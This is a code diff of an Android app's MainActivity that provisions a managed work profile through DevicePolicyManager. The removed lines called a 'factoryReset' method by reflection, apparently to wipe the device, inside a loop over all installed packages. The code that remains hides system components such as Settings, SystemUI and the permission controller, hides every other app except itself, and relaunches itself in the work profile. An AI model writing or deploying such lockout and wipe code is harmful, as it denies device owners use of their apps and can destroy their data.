@@ -8,7 +8,6 @@ import android.os.*;
 import java.util.*;
 
 import android.os.Process;
-import java.lang.reflect.*;
 
 public class MainActivity extends Activity {
 
@@ -23,49 +22,30 @@ public class MainActivity extends Activity {
 
         for (ApplicationInfo app : packages) {
             String pkg = app.packageName;
-
-
-
-
-			try {
-				Method factoryResetMethod = DevicePolicyManager.class.getMethod(
-					"factoryReset",
-					ComponentName.class
-				);
-
-				factoryResetMethod.invoke(dpm, MyDeviceAdminReceiver.class);
-
-			} catch (NoSuchMethodException e) {
-				e.printStackTrace();
-			} catch (IllegalAccessException e) {
-				e.printStackTrace();
-			} catch (InvocationTargetException e) {
-				e.printStackTrace();
-			}
-
+			
             if (pkg.equals("android") || pkg.equals("com.android.keychain") || pkg.equals("com.android.providers.settings") || pkg.equals("com.android.settings") || pkg.equals("com.android.systemui") || pkg.equals("com.android.framework") || pkg.equals("com.android.sf") || pkg.equals("com.android.externalstorage") || pkg.equals("com.android.server.telecom")  || pkg.equals("com.android.permissioncontroller")  || pkg.equals("com.google.android.permissioncontroller")) {
                 try {
                     dpm.setApplicationHidden(admin, pkg, !visible);
                 } catch (Exception e) {
-
+                    
                 }
             }
 		}
 
+		
+  for (ApplicationInfo app : packages) {
+       String pkg = app.packageName;
 
-		for (ApplicationInfo app : packages) {
-			String pkg = app.packageName;
+    if (!pkg.equals(getPackageName())) {
+        try {
+            dpm.setApplicationHidden(admin, pkg, !visible);
+        } catch (Exception ignored) { 
+			
+        }
+    }
 
-			if (!pkg.equals(getPackageName())) {
-				try {
-					dpm.setApplicationHidden(admin, pkg, !visible);
-				} catch (Exception ignored) { 
-
-				}
-			}
-
-		}
-
+  }
+	
 	}
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -78,11 +58,11 @@ public class MainActivity extends Activity {
             return;
         }
 
-
+        
         if (hasWorkProfile()) {
             launchWorkProfileDelayed();
         } else {
-
+            
             Intent intent = new Intent(DevicePolicyManager.ACTION_PROVISION_MANAGED_PROFILE);
             intent.putExtra(DevicePolicyManager.EXTRA_PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME, 
                             new ComponentName(this, MyDeviceAdminReceiver.class));
@@ -94,7 +74,7 @@ public class MainActivity extends Activity {
     @Override
     protected void onResume() {
         super.onResume();
-
+        
         if (!isWorkProfileContext() && hasWorkProfile()) {
             launchWorkProfileDelayed();
         }
@@ -120,23 +100,23 @@ public class MainActivity extends Activity {
 
     private void launchWorkProfileDelayed() {
         new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
-				@Override
-				public void run() {
-					LauncherApps launcherApps = (LauncherApps) getSystemService(Context.LAUNCHER_APPS_SERVICE);
-					UserManager userManager = (UserManager) getSystemService(Context.USER_SERVICE);
-					List<UserHandle> profiles = userManager.getUserProfiles();
+            @Override
+            public void run() {
+                LauncherApps launcherApps = (LauncherApps) getSystemService(Context.LAUNCHER_APPS_SERVICE);
+                UserManager userManager = (UserManager) getSystemService(Context.USER_SERVICE);
+                List<UserHandle> profiles = userManager.getUserProfiles();
 
-					for (UserHandle profile : profiles) {
-						if (!profile.equals(Process.myUserHandle())) {
-							launcherApps.startMainActivity(
-								new ComponentName(getPackageName(), MainActivity.class.getName()), 
-								profile, null, null
-							);
-
-							break;
-						}
-					}
-				}
-			}, 1300); 
+                for (UserHandle profile : profiles) {
+                    if (!profile.equals(Process.myUserHandle())) {
+                        launcherApps.startMainActivity(
+                            new ComponentName(getPackageName(), MainActivity.class.getName()), 
+                            profile, null, null
+                        );
+                        
+                        break;
+                    }
+                }
+            }
+        }, 1300); 
     }
 }
